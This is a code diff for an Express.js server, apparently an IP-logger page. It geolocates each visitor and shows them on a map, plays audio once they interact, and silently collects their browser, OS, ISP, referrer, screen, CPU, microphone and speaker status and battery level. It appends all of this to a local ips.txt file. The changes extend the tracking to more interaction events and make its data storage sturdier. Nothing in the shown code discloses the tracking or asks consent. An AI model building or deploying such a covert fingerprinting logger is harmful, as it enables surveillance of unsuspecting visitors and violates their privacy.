@@ -10,7 +10,6 @@ app.use(express.static(__dirname));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// TEMP STORAGE (per request simulation)
 let tempStore = {};
 
 // ================= MAIN PAGE =================
@@ -42,7 +41,7 @@ app.get("/", async (req, res) => {
       lon = response.data.lon;
       isp = response.data.isp || "Unknown";
     }
-  } catch (e) {}
+  } catch {}
 
   const time = new Date().toLocaleString("en-IN", {
     timeZone: "Asia/Kolkata"
@@ -50,7 +49,6 @@ app.get("/", async (req, res) => {
 
   const baseLog = `${ip}|${city}, ${country}|${browser}|${os}|${device}|${isp}|${referrer}|${time}`;
 
-  // store temporarily
   tempStore[ip] = { baseLog };
 
   res.send(`
@@ -106,14 +104,14 @@ app.get("/", async (req, res) => {
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
   L.marker([${lat}, ${lon}]).addTo(map).bindPopup("Visitor").openPopup();
 
-  // AUDIO PLAY
+  // AUDIO unlock
   const audio = document.getElementById("sound");
   const unlock = () => {
     audio.play().catch(()=>{});
-    events.forEach(e=>document.removeEventListener(e, unlock));
   };
-  const events = ["click","touchstart","scroll","keydown"];
-  events.forEach(e=>document.addEventListener(e, unlock, {once:true}));
+  ["click","touchstart","keydown"].forEach(e=>{
+    document.addEventListener(e, unlock, {once:true});
+  });
 
   const screenSize = screen.width + "x" + screen.height;
   const cpu = navigator.hardwareConcurrency || "Unknown";
@@ -166,10 +164,14 @@ app.get("/", async (req, res) => {
     });
   }
 
-  document.addEventListener("click", () => {
+  function runAll() {
     detectAudio();
     detectBattery();
-  }, { once: true });
+  }
+
+  ["click","touchstart","keydown"].forEach(e=>{
+    document.addEventListener(e, runAll, {once:true});
+  });
 </script>
 
 </body>
@@ -181,8 +183,11 @@ app.get("/", async (req, res) => {
 app.post("/log-extra", (req, res) => {
   const { ip, screen, cpu } = req.body;
 
-  tempStore[ip].screen = screen;
-  tempStore[ip].cpu = cpu;
+  tempStore[ip] = {
+    ...tempStore[ip],
+    screen,
+    cpu
+  };
 
   res.sendStatus(200);
 });
@@ -191,7 +196,10 @@ app.post("/log-extra", (req, res) => {
 app.post("/log-audio", (req, res) => {
   const { ip, mic, speakers } = req.body;
 
-  tempStore[ip].audio = `Mic:${mic}, Speakers:${speakers}`;
+  tempStore[ip] = {
+    ...tempStore[ip],
+    audio: `Mic:${mic}, Speakers:${speakers}`
+  };
 
   res.sendStatus(200);
 });
@@ -201,10 +209,12 @@ app.post("/log-battery", (req, res) => {
   const { ip, level, charging } = req.body;
 
   const data = tempStore[ip];
+  if (!data || !data.baseLog) return res.sendStatus(200);
 
-  const finalLog = `${data.baseLog}|${data.screen}|CPU:${data.cpu}|${data.audio}|Battery:${level}, Charging:${charging}\n`;
+  const finalLog =
+    `${data.baseLog}|${data.screen || "Unknown"}|CPU:${data.cpu || "Unknown"}|${data.audio || "No permission"}|Battery:${level}, Charging:${charging}\n`;
 
-  fs.appendFileSync(__dirname + "/ips.txt", finalLog);
+  fs.appendFileSync("ips.txt", finalLog);
 
   delete tempStore[ip];
 
